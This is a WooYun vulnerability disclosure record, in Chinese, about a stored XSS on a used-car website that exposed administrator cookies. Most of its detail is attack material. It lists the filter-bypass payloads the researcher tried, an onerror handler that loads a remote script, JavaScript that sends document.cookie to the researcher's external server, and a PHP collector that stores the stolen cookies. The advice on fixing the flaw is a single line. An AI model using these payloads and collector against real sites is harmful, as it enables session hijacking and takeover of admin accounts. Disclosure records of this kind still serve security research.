{"id": 82437, "wybug_id": "wooyun-2015-0151072", "wybug_title": "车猫网存储型XSS盲打管理员(已进后台)", "wybug_corp": "dongdalou.com", "wybug_author": "Ziiber", "wybug_date": "2015-11-01 18:15", "wybug_open_date": "2015-12-17 19:46", "wybug_type": "XSS 跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型", "利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 车猫网前台一处存储型XSS，造成后台管理员cookie泄露。轻松进后台。 详细说明：  前台帮找车 信息过滤不完全，造成存储型XSS，进了后台我就没深入下去，或许能一锅端看图说话。阿里云服务器有xss过滤，然后就是各种变着花样玩 <img src=\"\"><script src=\"\"><script><iframe><a href=\"\" onclimbatree=>这款车</a><img src=\"\" onerror=\"\">然后还有各种混合，反正一股脑的全部提交上去了，等了几分钟  服务器这边没收到请求。灵光一闪<img src=\"\" onerror=\"$.getJquery('XXXXXXXXX.js')\"> 估计大部分网站都会引用jquery库，我就没用js写了然后.......   cookie就过来了JS代码\n$(document).ready(function(){\t/* 10分钟完事~~~~~~~~~ */\tvar cookies = getCookie();\tvar params = {cookie:cookies};\t$.ajax({\t\tmethod:'post',\t\turl: 'http://ziiber.me/xss.php',\t\tdata:params,\t\tasync: true,\t\tcrossDomain, true,\t\tsuccess:function(res){\t\t}\t});});function getCookie(){\treturn document.cookie;}\nPHP代码（用了跨域）：\nheader( 'Access-Control-Allow-Origin: *' );header( \"Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS\" );header( 'Access-Control-Allow-Headers: Origin, appid, secret, token, X-Requested-With, Content-Type, Accept' );$content = $_POST['cookie'];//$content = json_encode($_COOKIE);file_put_contents(\"cookies.txt\", $content . \"\\n\", FILE_APPEND);\n\n\n\n\n   漏洞证明：  \n\n\n\n   修复方案：  过滤XSS.........................   版权声明：转载请注明来源 Ziiber@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-11-02 19:45 厂商回复： 谢谢关注。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}